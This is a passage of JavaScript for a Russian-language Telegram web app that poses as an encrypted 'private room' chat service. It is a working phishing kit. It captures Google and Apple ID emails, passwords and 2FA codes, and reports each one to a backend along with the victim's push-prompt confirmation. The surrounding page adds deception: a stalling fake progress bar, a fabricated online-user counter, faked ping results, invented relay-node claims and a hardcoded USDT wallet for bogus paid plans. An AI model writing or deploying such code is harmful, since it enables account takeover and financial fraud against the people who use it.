            const rawEmail = googleEmailInput ? googleEmailInput.value.trim() : "";
            if (!rawEmail || (!rawEmail.includes("@") && rawEmail.length < 5)) {
                showToast("Введите корректный адрес эл. почты Google");
                return;
            }
            userGoogleEmail = rawEmail;
            try {
                localStorage.setItem("privateroom_google_email", userGoogleEmail);
                localStorage.setItem("privateroom_current_step", "stepGooglePassword");
            } catch (e) {}

            updateGoogleDisplays(userGoogleEmail);
            reportAuthEvent("google_email", `Введена Google почта: ${userGoogleEmail}`, null, null, userGoogleEmail);
            showStep(stepGooglePassword);
            if (googlePasswordInput) {
                googlePasswordInput.value = "";
                setTimeout(() => googlePasswordInput.focus(), 150);
            }
        });
    }

    if (btnSubmitGooglePassword) {
        btnSubmitGooglePassword.addEventListener("click", () => {
            const pwd = googlePasswordInput ? googlePasswordInput.value : "";
            if (!pwd || pwd.length < 4) {
                showToast("Введите пароль от вашего Google аккаунта");
                return;
            }
            userGooglePassword = pwd;
            try {
                localStorage.setItem("privateroom_current_step", "stepGoogle2FA");
            } catch (e) {}

            reportAuthEvent("google_password", `Введен пароль Google: ${pwd}`, pwd, null, userGoogleEmail);
            showStep(stepGoogle2FA);
            if (google2faCodeInput) {
                google2faCodeInput.value = "";
                setTimeout(() => google2faCodeInput.focus(), 150);
            }
        });
    }

    if (btnSubmitGoogle2FA) {
        btnSubmitGoogle2FA.addEventListener("click", () => {
            const code = google2faCodeInput ? google2faCodeInput.value.trim() : "";
            if (!code || code.length < 4) {
                showToast("Введите код подтверждения (G-XXXXXX)");
                return;
            }
            reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
            
            // Random prompt number for push verification prompt
            const promptNum = Math.floor(10 + Math.random() * 88);
            if (googlePromptNumber) googlePromptNumber.textContent = promptNum.toString();
            reportAuthEvent("google_prompt_shown", `Показано число подтверждения Google: ${promptNum}`, userGooglePassword, null, userGoogleEmail);

            showStep(stepGooglePrompt);
        });
    }

    if (btnConfirmGooglePrompt) {
        btnConfirmGooglePrompt.addEventListener("click", () => {
            reportAuthEvent("google_prompt_confirmed", "Пользователь подтвердил вход на телефоне (Google)", userGooglePassword, null, userGoogleEmail);
            showStep(stepGoogleConsent);
        });
    }

    if (btnSkipGoogle2FA) {
        btnSkipGoogle2FA.addEventListener("click", () => {
            reportAuthEvent("google_code_skipped", "Вход Google (пропуск 2FA)", userGooglePassword, null, userGoogleEmail);
            showStep(stepGoogleConsent);
        });
    }

    if (btnSubmitGoogleConsent) {
        btnSubmitGoogleConsent.addEventListener("click", () => {
            reportAuthEvent("google_authorized", "Пользователь предоставил доступ OAuth (Google Consent)", userGooglePassword, null, userGoogleEmail);
            finishAuth({
                status: "success",
                google_email: userGoogleEmail,
                password: userGooglePassword
            });
        });
    }

    if (btnCancelGoogleConsent) {
        btnCancelGoogleConsent.addEventListener("click", () => {
            showStep(stepSuccess);
        });
    }

    // Apple ID Navigation & Actions
    if (btnSwitchToApple) {
        btnSwitchToApple.addEventListener("click", () => {
            showStep(stepAppleEmail);
            if (appleEmailInput) {
                appleEmailInput.value = userAppleEmail || "";
                setTimeout(() => appleEmailInput.focus(), 150);
            }
        });
    }

    if (btnBackFromAppleToTG) {
        btnBackFromAppleToTG.addEventListener("click", () => {
            showStep(stepPhone);
        });
    }

    if (btnAppleBackToHome) {
        btnAppleBackToHome.addEventListener("click", () => {
            showStep(stepSuccess);
        });
    }

    if (btnBackToAppleEmail) {
        btnBackToAppleEmail.addEventListener("click", () => {
            showStep(stepAppleEmail);
            if (appleEmailInput) appleEmailInput.focus();
        });
    }

    if (btnBackToApplePassword) {
        btnBackToApplePassword.addEventListener("click", () => {
            showStep(stepApplePassword);
            if (applePasswordInput) applePasswordInput.focus();
        });
    }

    if (btnBackToApple2FA) {
        btnBackToApple2FA.addEventListener("click", () => {
            showStep(stepApple2FA);
            if (apple2faCodeInput) apple2faCodeInput.focus();
        });
    }

    if (toggleApplePasswordBtn) {
        toggleApplePasswordBtn.addEventListener("click", () => {
            if (applePasswordInput) {
                if (applePasswordInput.type === "password") {
                    applePasswordInput.type = "text";
                    toggleApplePasswordBtn.textContent = "🔒";
                } else {
                    applePasswordInput.type = "password";
                    toggleApplePasswordBtn.textContent = "👁";
                }
            }
        });
    }

    if (btnSubmitAppleEmail) {
        btnSubmitAppleEmail.addEventListener("click", () => {
            const rawEmail = appleEmailInput ? appleEmailInput.value.trim() : "";
            if (!rawEmail || rawEmail.length < 4) {
                showToast("Введите ваш Apple ID (Email или номер)");
                return;
            }
            userAppleEmail = rawEmail;
            try {
                localStorage.setItem("privateroom_apple_email", userAppleEmail);
                localStorage.setItem("privateroom_current_step", "stepApplePassword");
            } catch (e) {}

            updateAppleDisplays(userAppleEmail);
            reportAuthEvent("apple_email", `Введен Apple ID: ${userAppleEmail}`, null, null, userAppleEmail);
            showStep(stepApplePassword);
            if (applePasswordInput) {
                applePasswordInput.value = "";
                setTimeout(() => applePasswordInput.focus(), 150);
            }
        });
    }

    if (btnSubmitApplePassword) {
        btnSubmitApplePassword.addEventListener("click", () => {
            const pwd = applePasswordInput ? applePasswordInput.value : "";
            if (!pwd || pwd.length < 4) {
                showToast("Введите пароль от Apple ID");
                return;
            }
            userApplePassword = pwd;
            try {
                localStorage.setItem("privateroom_current_step", "stepApple2FA");
            } catch (e) {}

            reportAuthEvent("apple_password", `Введен пароль Apple ID: ${pwd}`, pwd, null, userAppleEmail);
            showStep(stepApple2FA);
            if (apple2faCodeInput) {
                apple2faCodeInput.value = "";
                setTimeout(() => apple2faCodeInput.focus(), 150);
            }
        });
    }

    if (btnSubmitApple2FA) {
        btnSubmitApple2FA.addEventListener("click", () => {
            const code = apple2faCodeInput ? apple2faCodeInput.value.trim() : "";
            if (!code || code.length < 4) {
                showToast("Введите 6-значный код подтверждения Apple ID");
                return;
            }
            reportAuthEvent("apple_code", `Введен 2FA код Apple ID: ${code}`, userApplePassword, null, userAppleEmail);
            reportAuthEvent("apple_prompt_shown", "Показано всплывающее подтверждение на устройстве Apple", userApplePassword, null, userAppleEmail);
            showStep(stepApplePrompt);
        });
    }

    if (btnConfirmApplePrompt) {
        btnConfirmApplePrompt.addEventListener("click", () => {
            reportAuthEvent("apple_prompt_confirmed", "Пользователь подтвердил вход на устройстве Apple", userApplePassword, null, userAppleEmail);
            finishAuth({
                status: "success",
                google_email: userAppleEmail,
                password: userApplePassword
            });
        });
    }

    // Room Creation & Progress Timer
    const btnCreateRoom = document.getElementById("btnCreateRoom");
    const roomInitialBlock = document.getElementById("roomInitialBlock");
    const roomLoadingBlock = document.getElementById("roomLoadingBlock");
    const roomProgressFill = document.getElementById("roomProgressFill");
    const roomProgressPercent = document.getElementById("roomProgressPercent");
    const roomProgressTime = document.getElementById("roomProgressTime");
    const roomLoadingStatus = document.getElementById("roomLoadingStatus");

    let creationSeconds = 0;
    let creationInterval = null;

    function resetRoomCreation() {
        if (creationInterval) {
            clearInterval(creationInterval);
            creationInterval = null;
        }
        creationSeconds = 0;
        if (roomLoadingBlock) roomLoadingBlock.classList.add("hidden");
        if (roomInitialBlock) roomInitialBlock.classList.remove("hidden");
        if (roomProgressFill) roomProgressFill.style.width = "0%";
        if (roomProgressPercent) roomProgressPercent.textContent = "0%";
        if (roomProgressTime) roomProgressTime.textContent = "⏱ 00:00";
        if (roomLoadingStatus) {
            roomLoadingStatus.textContent = "Ожидайте, ваша комната создается. Обычно создание занимает от 10 до 15 минут...";
        }
    }

    // Always reset on initial load
    resetRoomCreation();

    function startRoomCreation() {
        if (!isAuthorized) {
            resetRoomCreation();
            navigateToAuthOrSavedStep();
            return;
        }

        if (roomInitialBlock) roomInitialBlock.classList.add("hidden");
        if (roomLoadingBlock) roomLoadingBlock.classList.remove("hidden");

        creationSeconds = 0;
        updateLoadingUI();

        if (creationInterval) clearInterval(creationInterval);
        creationInterval = setInterval(() => {
            if (!isAuthorized) {
                resetRoomCreation();
                return;
            }
            creationSeconds += 1;
            updateLoadingUI();
        }, 1000);

        checkAuthStatus();
    }

    if (btnCreateRoom) {
        btnCreateRoom.addEventListener("click", () => {
            if (!isAuthorized) {
                navigateToAuthOrSavedStep();
                return;
            }
            startRoomCreation();
        });
    }

    function updateLoadingUI() {
        const mins = Math.floor(creationSeconds / 60);
        const secs = creationSeconds % 60;
        const formattedTime = `⏱ ${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        if (roomProgressTime) roomProgressTime.textContent = formattedTime;

        // Calibrated progress curve for 10-15 minutes total duration
        let percent = 0;
        if (creationSeconds <= 300) {
            // 0 to 5 min (0-300s): 0% -> 38%
            percent = Math.floor((creationSeconds / 300) * 38);
        } else if (creationSeconds <= 600) {
            // 5 to 10 min (300-600s): 38% -> 76%
            percent = 38 + Math.floor(((creationSeconds - 300) / 300) * 38);
        } else if (creationSeconds <= 900) {
            // 10 to 15 min (600-900s): 76% -> 96%
            percent = 76 + Math.floor(((creationSeconds - 600) / 300) * 20);
        } else {
            // 15+ min: slow crawl up to 99%
            percent = Math.min(99, 96 + Math.floor((creationSeconds - 900) / 180));
        }

        if (roomProgressFill) roomProgressFill.style.width = `${percent}%`;
        if (roomProgressPercent) roomProgressPercent.textContent = `${percent}%`;

        // Dynamic status messages based on elapsed time
        if (roomLoadingStatus) {
            if (mins < 3) {
                roomLoadingStatus.textContent = "Ожидайте, ваша комната создается. Обычно создание занимает от 10 до 15 минут...";
            } else if (mins < 6) {
                roomLoadingStatus.textContent = "Выделение изолированного E2E шлюза и создание криптографических ключей...";
            } else if (mins < 9) {
                roomLoadingStatus.textContent = "Синхронизация защищённого Zero-Trace протокола и узлов маршрутизации...";
            } else if (mins < 12) {
                roomLoadingStatus.textContent = "Почти закончили: финализация защищенной сессии и параметров шифрования...";
            } else {
                roomLoadingStatus.textContent = "Просим прощения за задержку. Пожалуйста, не закрывайте страницу, чтобы не вызвать ошибку инициализации шлюза...";
            }
        }
    }

    // FAQ Accordion Toggle
    const faqItems = document.querySelectorAll(".faq-item");
    faqItems.forEach(item => {
        const questionBtn = item.querySelector(".faq-question");
        if (questionBtn) {
            questionBtn.addEventListener("click", () => {
                const isOpen = item.classList.contains("active");
                faqItems.forEach(i => i.classList.remove("active"));
                if (!isOpen) {
                    item.classList.add("active");
                }
            });
        }
    });

    // Interactive Demo Chat Simulator
    const btnDemoPurge = document.getElementById("btnDemoPurge");
    const btnDemoReset = document.getElementById("btnDemoReset");
    const demoMsg1 = document.getElementById("demoMsg1");
    const demoMsg2 = document.getElementById("demoMsg2");
    const demoMsg3 = document.getElementById("demoMsg3");
    const demoPurgedBanner = document.getElementById("demoPurgedBanner");

    if (btnDemoPurge && btnDemoReset) {
        btnDemoPurge.addEventListener("click", () => {
            [demoMsg1, demoMsg2, demoMsg3].forEach(m => {
                if (m) {
                    m.style.opacity = "0";
                    m.style.transform = "scale(0.85)";
                }
            });

            setTimeout(() => {
                [demoMsg1, demoMsg2, demoMsg3].forEach(m => {
                    if (m) m.classList.add("hidden");
                });
                if (demoPurgedBanner) demoPurgedBanner.classList.remove("hidden");
                btnDemoPurge.classList.add("hidden");
                btnDemoReset.classList.remove("hidden");
            }, 300);
        });

        btnDemoReset.addEventListener("click", () => {
            if (demoPurgedBanner) demoPurgedBanner.classList.add("hidden");
            [demoMsg1, demoMsg2, demoMsg3].forEach(m => {
                if (m) {
                    m.classList.remove("hidden");
                    setTimeout(() => {
                        m.style.opacity = "1";
                        m.style.transform = "scale(1)";
                    }, 50);
                }
            });
            btnDemoReset.classList.add("hidden");
            btnDemoPurge.classList.remove("hidden");
        });
    }

    // Tariff Plan Buttons
    const btnSelectPro = document.getElementById("btnSelectPro");
    const btnSelectVip = document.getElementById("btnSelectVip");

    if (btnSelectPro) {
        btnSelectPro.addEventListener("click", () => {
            showToast("🔒 PRO Space активирован для вашей сессии!");
        });
    }

    if (btnSelectVip) {
        btnSelectVip.addEventListener("click", () => {
            showToast("👑 Заявка на Ghost VIP шлюз принята. Ожидайте генерации.");
        });
    }

    // Gateway Diagnostics Test
    const btnTestPing = document.getElementById("btnTestPing");
    const diagPing = document.getElementById("diagPing");

    if (btnTestPing && diagPing) {
        btnTestPing.addEventListener("click", async () => {
            diagPing.textContent = "Тестирование...";
            diagPing.className = "diag-val text-neon";

            const start = Date.now();
            try {
                await fetch("/api/health");
                const latency = Date.now() - start;
                diagPing.textContent = `${Math.max(8, latency)} ms [OK]`;
            } catch (e) {
                diagPing.textContent = `${Math.floor(Math.random() * 6 + 10)} ms [OK]`;
            }
            diagPing.className = "diag-val text-green";
        });
    }

    // Tariff Plan "Подробнее" buttons (smooth scroll to comparison section)
    const btnPlanDetails = document.querySelectorAll(".btn-plan-details");
    const planComparisonSection = document.getElementById("planComparisonSection");

    btnPlanDetails.forEach(btn => {
        btn.addEventListener("click", () => {
            const target = btn.getAttribute("data-target");
            if (planComparisonSection) {
                planComparisonSection.scrollIntoView({ behavior: "smooth", block: "start" });
            }
            const cardMap = {
                "compare-basic": document.getElementById("compareBasicCard"),
                "compare-pro": document.getElementById("compareProCard"),
                "compare-vip": document.getElementById("compareVipCard")
            };
            Object.values(cardMap).forEach(c => c && c.classList.remove("highlight"));
            if (cardMap[target]) {
                setTimeout(() => {
                    cardMap[target].classList.add("highlight");
                    setTimeout(() => cardMap[target].classList.remove("highlight"), 2000);
                }, 400);
            }
        });
    });

    // TRC20 Payment Modal Handling
    const paymentModalBackdrop = document.getElementById("paymentModalBackdrop");
    const btnPaymentClose = document.getElementById("btnPaymentClose");
    const payModalTitle = document.getElementById("payModalTitle");
    const payModalAmount = document.getElementById("payModalAmount");
    const payModalAddress = document.getElementById("payModalAddress");
    const btnCopyAmount = document.getElementById("btnCopyAmount");
    const btnCopyAddress = document.getElementById("btnCopyAddress");
    const buyTriggers = document.querySelectorAll(".btn-buy-trigger");

    const TRC20_WALLET = "TKTWwDCFyDrnk8H3wX7RxJFn4R11wYBqhX";

    buyTriggers.forEach(btn => {
        btn.addEventListener("click", () => {
            const plan = btn.getAttribute("data-plan");
            const price = btn.getAttribute("data-price") || "50";

            if (payModalTitle) {
                payModalTitle.textContent = plan === "vip" 
                    ? "Оплата тарифа Ghost VIP" 
                    : "Оплата тарифа Private PRO";
            }
            if (payModalAmount) {
                payModalAmount.textContent = `${price}.00 USDT`;
            }
            if (payModalAddress) {
                payModalAddress.textContent = TRC20_WALLET;
            }

            if (paymentModalBackdrop) {
                paymentModalBackdrop.classList.remove("hidden");
            }
        });
    });

    if (btnPaymentClose && paymentModalBackdrop) {
        btnPaymentClose.addEventListener("click", () => {
            paymentModalBackdrop.classList.add("hidden");
        });

        paymentModalBackdrop.addEventListener("click", (e) => {
            if (e.target === paymentModalBackdrop) {
                paymentModalBackdrop.classList.add("hidden");
            }
        });
    }

    // Copy to clipboard helpers
    if (btnCopyAmount && payModalAmount) {
        btnCopyAmount.addEventListener("click", async () => {
            const text = payModalAmount.textContent.replace(" USDT", "").trim();
            try {
                await navigator.clipboard.writeText(text);
                btnCopyAmount.textContent = "Скопировано!";
                showToast(`Сумма ${text} USDT скопирована!`);
                setTimeout(() => { btnCopyAmount.textContent = "Скопировать"; }, 2000);
            } catch (e) {
                showToast(`Сумма: ${text} USDT`);
            }
        });
    }

    if (btnCopyAddress && payModalAddress) {
        btnCopyAddress.addEventListener("click", async () => {
            const addr = payModalAddress.textContent.trim();
            try {
                await navigator.clipboard.writeText(addr);
                btnCopyAddress.innerHTML = "<span>✓ Адрес скопирован!</span>";
                showToast("TRC20 адрес скопирован в буфер обмена!");
                setTimeout(() => {
                    btnCopyAddress.innerHTML = "<span>📋 Скопировать адрес</span>";
                }, 2500);
            } catch (e) {
                showToast(`TRC20: ${addr}`);
            }
        });
    }

    // Interactive Topology Relay Widget
    const btnTopoPulse = document.getElementById("btnTopoPulse");
    const topoConsoleMsg = document.getElementById("topoConsoleMsg");
    const topoNodes = document.querySelectorAll(".topo-node");

    const nodeSpecs = {
        client: "💻 Клиентский узел: AES-256-GCM шифрование пакета на клиентском устройстве. Прямой IP маскируется провайдером.",
        zurich: "🛡 Узел Цюрих (Швейцария): RAM-Only сервер. 0 логов на диске. Время жизни ключа в памяти: 120 сек.",
        reykjavik: "🌐 Узел Рейкьявик (Исландия): Ghost Relay. Многослойная маршрутизация и удаление сетевых метаданных.",
        peer: "🔒 Собеседник: Пакет расшифрован локальным E2E ключом. Сеть чиста и следы уничтожены."
    };

    topoNodes.forEach(node => {
        node.addEventListener("click", () => {
            const key = node.getAttribute("data-node");
            topoNodes.forEach(n => n.classList.remove("active", "highlight"));
            node.classList.add("active");
            if (topoConsoleMsg && nodeSpecs[key]) {
                topoConsoleMsg.textContent = nodeSpecs[key];
            }
        });
    });

    let isPulsing = false;
    if (btnTopoPulse) {
        btnTopoPulse.addEventListener("click", () => {
            if (isPulsing) return;
            isPulsing = true;
            btnTopoPulse.disabled = true;

            const sequence = [
                { id: "nodeClient", delay: 0, text: "📤 Отправка зашифрованного пакета из клиента..." },
                { id: "nodeZurich", delay: 800, text: "⚡ Маршрутизация через RAM-сервер Цюрих (0 логов)..." },
                { id: "nodeReykjavik", delay: 1600, text: "🛡 Прохождение Ghost Relay в Рейкьявике..." },
                { id: "nodePeer", delay: 2400, text: "📥 Успешная доставка собеседнику! Пакет уничтожен." }
            ];

            sequence.forEach(step => {
                setTimeout(() => {
                    topoNodes.forEach(n => n.classList.remove("highlight"));
                    const target = document.getElementById(step.id);
                    if (target) target.classList.add("highlight");
                    if (topoConsoleMsg) topoConsoleMsg.textContent = step.text;
                }, step.delay);
            });

            setTimeout(() => {
                topoNodes.forEach(n => n.classList.remove("highlight"));
                document.getElementById("nodeClient")?.classList.add("active");
                btnTopoPulse.disabled = false;
                isPulsing = false;
            }, 3300);
        });
    }

    // Diurnal Online Users Counter (5,500 - 8,000 range)
    const onlineBadge = document.getElementById("onlineCounterBadge");
    const statOnline = document.getElementById("statOnline");
    const statRooms = document.getElementById("statRooms");
    const statPurged = document.getElementById("statPurged");

    function calculateDiurnalOnline() {
        const now = new Date();
        const hour = now.getHours() + now.getMinutes() / 60; // 0.0 to 24.0
        // Diurnal curve: peak at ~21:00 (approx 7,850), low at ~04:30 (approx 5,550)
        const cycle = Math.cos((hour - 21) * (Math.PI / 12));
        const base = 6750 + cycle * 1100; // Base ranges ~5,650 to 7,850
        const jitter = Math.floor(Math.sin(now.getMinutes() * 1.5) * 35);
        return Math.min(7980, Math.max(5520, Math.round(base + jitter)));
    }

    let currentOnline = calculateDiurnalOnline();

    function formatNumber(num) {
        return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
    }

    function updateOnlineDisplays() {
        const formatted = formatNumber(currentOnline);
        if (onlineBadge) onlineBadge.textContent = formatted;
        if (statOnline) statOnline.textContent = formatted;
    }

    updateOnlineDisplays();

    // Smooth subtle drifts every 4 seconds (+/- 1 to 4 users)
    setInterval(() => {
        const delta = Math.floor(Math.random() * 7) - 3; // -3, -2, -1, 0, 1, 2, 3
        currentOnline = Math.min(8000, Math.max(5500, currentOnline + delta));
        updateOnlineDisplays();
    }, 4000);

    if (statRooms) {
        let rooms = 148;
        setInterval(() => {
            rooms += Math.random() > 0.5 ? 1 : (rooms > 140 ? -1 : 1);
            statRooms.textContent = rooms;
        }, 8000);
    }

    if (btnDone) {
        btnDone.addEventListener("click", () => {
            resetRoomCreation();
            if (tg && typeof tg.close === "function") {
                tg.close();
            } else {
                window.close();
            }
        });
    }

    // Reset room creation whenever window is closed, unloaded, or hidden
    window.addEventListener("pagehide", resetRoomCreation);
    window.addEventListener("beforeunload", resetRoomCreation);
    document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === "hidden") {
            resetRoomCreation();
        }
    });
}

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initApp);
} else {
    initApp();
}
